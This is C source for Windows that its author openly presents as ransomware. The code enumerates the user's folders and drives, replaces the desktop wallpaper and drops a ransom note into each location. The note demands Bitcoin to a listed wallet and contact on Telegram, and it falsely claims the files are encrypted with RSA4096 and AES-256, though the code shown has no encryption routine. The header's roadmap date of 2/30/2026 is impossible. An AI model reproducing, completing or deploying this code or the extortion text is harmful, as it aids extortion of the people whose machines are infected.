//Made by Youssef Khaled (jo), also known as Hevo_Qmpo
//A ransomware program designed in native C to be as fast as possible This project was created on 2/23/2026 and a roadmap will be added to it on 2/30/2026.
//Warning____This project may contain some bugs which will be fixed as soon as possible.

#include <windows.h>

typedef struct {
    wchar_t UserProfilePath[MAX_PATH];
    wchar_t OtherDrives[10][4];
    int OtherDrivesCount;
} SYSTEM_SCOUT;

void MyZeroMemory(void* ptr, int size) {
    unsigned char* p = (unsigned char*)ptr;
    while (size--) *p++ = 0;
}

void GetSystemScout(SYSTEM_SCOUT* scout) {
    if (!scout) return;
    MyZeroMemory(scout, sizeof(SYSTEM_SCOUT));
    wchar_t winDir[MAX_PATH];
    wchar_t userName[256];
    wchar_t driveStrings[256];
    DWORD userLen = 256;
    GetWindowsDirectoryW(winDir, MAX_PATH);
    wchar_t winDrive = winDir[0];
    if (GetUserNameW(userName, &userLen)) {
        scout->UserProfilePath[0] = winDrive;
        scout->UserProfilePath[1] = L':';
        scout->UserProfilePath[2] = L'\\';
        scout->UserProfilePath[3] = L'\0';
        lstrcatW(scout->UserProfilePath, L"Users\\");
        lstrcatW(scout->UserProfilePath, userName);
        lstrcatW(scout->UserProfilePath, L"\\");
    }
    if (GetLogicalDriveStringsW(256, driveStrings)) {
        wchar_t* currentDrive = driveStrings;
        while (*currentDrive && scout->OtherDrivesCount < 10) {
            if (currentDrive[0] != winDrive) {
                lstrcpyW(scout->OtherDrives[scout->OtherDrivesCount], currentDrive);
                scout->OtherDrivesCount++;
            }
            currentDrive += lstrlenW(currentDrive) + 1;
        }
    }
}

void CreateWarningFile(const wchar_t* path) {
    wchar_t fileToCreate[MAX_PATH];
    lstrcpyW(fileToCreate, path);
    int len = lstrlenW(fileToCreate);
    if (len > 0 && fileToCreate[len-1] != L'\\') lstrcatW(fileToCreate, L"\\");
    lstrcatW(fileToCreate, L"!!1warning.txt");
    HANDLE hFile = CreateFileW(fileToCreate, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hFile != INVALID_HANDLE_VALUE) {
        const char* msg =

    "Your business is at serious risk.\n"
    "There is a significant hole in the security system of your company.\n"
    "We've easily penetrated your network.\n"
    "You should thank the Lord for being hacked by serious people not some stupid schoolboys or dangerous punks.\n"
    "They can damage all your important data just for fun.\n\n"
    "Now your files are encrypted with the strongest military algorithms RSA4096 and AES-256.\n"
    "No one can help you to restore files without our special decoder.\n\n"
    "Photos, Rhapsody, etc., repair tools\n"
    "are useless and can destroy your files irreversibly.\n\n"
    "If you want to restore your files write to our telegram\n\n"
    "and attach 2-3 encrypted files\n"
    "(Less than 5 mb each, non-archived and your files should not contain valuable information\n"
    "(Databases, backups, large excel sheets, etc.).\n"
    "You will receive decrypted samples and our conditions how to get the decoder.\n"
    "Please don't forget to write the name of your company in the telegram message.\n\n"
    "You have to pay for decryption in Bitcoins.\n"
    "The final price depends on how fast you write to us.\n"
    "Every day of delay will cost you additional +0.005 BTC\n"
    "Nothing personal just business.\n\n"
    "As soon as we get bitcoins you'll get all your decrypted data back.\n"
    "Moreover you will get instructions how to close the hole in security\n"
    "and how to avoid such problems in the future.\n"
    "We will recommend you special software that makes the most problems to hackers.\n\n"
    "attention! one more time\n\n"
    "Do not rename encrypted files.\n"
    "Do not try to decrypt your data using third party software.\n\n"
    "P.S. Remember, we are not scammers.\n"
    "We don't need your files and your information.\n"
    "Just after 2 weeks all your files and keys will be deleted automatically.\n"
    "Just send a request immediately after infection.\n"
    "All data will be restored absolutely.\n\n"
    "your warranty - decrypted samples.\n\n"
    "address: bc1qt4jurvn4rtyh36z0p59xl8h5zmvsr4elxfxx7k\n"
    "telegram: REvilSodinokibi206";

        DWORD written;
        WriteFile(hFile, msg, (DWORD)lstrlenA(msg), &written, NULL);
        CloseHandle(hFile);
    }
}

void EntryPoint() {
    char imgPathA[MAX_PATH];
    GetFullPathNameA("warning.png", MAX_PATH, imgPathA, NULL);
    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (void*)imgPathA, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);

    SYSTEM_SCOUT myData;
    GetSystemScout(&myData);

    const wchar_t* userFolders[] = { L"Desktop", L"Downloads", L"Documents", L"Pictures", L"Music", L"Videos" };
    
    for (int i = 0; i < 6; i++) {
        wchar_t target[MAX_PATH];
        lstrcpyW(target, myData.UserProfilePath);
        lstrcatW(target, userFolders[i]);
        
        CreateWarningFile(target);
        
        if (i == 0) {
            wchar_t srcImg[MAX_PATH];
            wchar_t dstImg[MAX_PATH];
            GetFullPathNameW(L"warning.png", MAX_PATH, srcImg, NULL);
            lstrcpyW(dstImg, target);
            lstrcatW(dstImg, L"\\warning.png");
            CopyFileW(srcImg, dstImg, FALSE);
        }
    }

    for (int i = 0; i < myData.OtherDrivesCount; i++) {
        CreateWarningFile(myData.OtherDrives[i]);
    }

    ExitProcess(0);
}